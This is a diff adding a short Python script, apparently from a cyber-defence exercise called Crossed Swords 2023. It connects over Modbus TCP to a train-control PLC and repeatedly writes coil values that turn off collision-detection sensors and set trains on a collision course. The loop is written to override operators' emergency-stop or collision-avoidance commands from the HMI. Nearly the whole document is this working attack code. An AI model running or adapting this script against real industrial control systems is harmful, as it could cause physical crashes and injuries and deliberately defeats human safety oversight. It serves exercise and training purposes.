@@ -1,0 +1,45 @@
+#-----------------------------------------------------------------------------
+# Name:        PLC_false_command_injector.py
+#
+# Purpose:     A false command injection attack program to inject the invalid 
+#              false train collection detection sensors power off and then control 
+#              the train to collide.(Demo)
+#
+# Author:      Yuancheng Liu
+#
+# Created:     2023/10/02
+# Version:     v_0.1
+# Copyright:   
+# License:     
+#-----------------------------------------------------------------------------
+""" Demo attack script for Crossed swords 2023"""
+import time
+import modbusTcpCom
+
+#hostIp = '172.23.155.209'
+#hostPort = 502
+
+hostIp = '127.0.0.1'
+hostPort = 504
+
+# Try to connect toTrain control PLC  PLC 
+client = modbusTcpCom.modbusTcpClient(hostIp, tgtPort=hostPort)
+print('Try to connect to the target victim train control PLC: %s' %str(hostIp))
+while not client.checkConn():
+    print('Try connect to the PLC')
+    print(client.getCoilsBits(0, 4))
+    time.sleep(0.5)
+# Start the attack
+print('Target PLC accept connection request.')
+time.sleep(1)
+while True:
+    # loop sending the false command to avoid/overwrite the people at HMI side take action to avoid the attack happen
+    # Such as set train we-0 emergy stop or turn on the auto collision avoidance. 
+    print("Inject wrong data...")
+    rst = client.setCoilsBit(10, False)
+    time.sleep(0.2)
+    client.setCoilsBit(1, False)
+    time.sleep(0.2)
+    client.setCoilsBit(0, True)
+    time.sleep(0.5)
+    if not rst: print("injection failed")
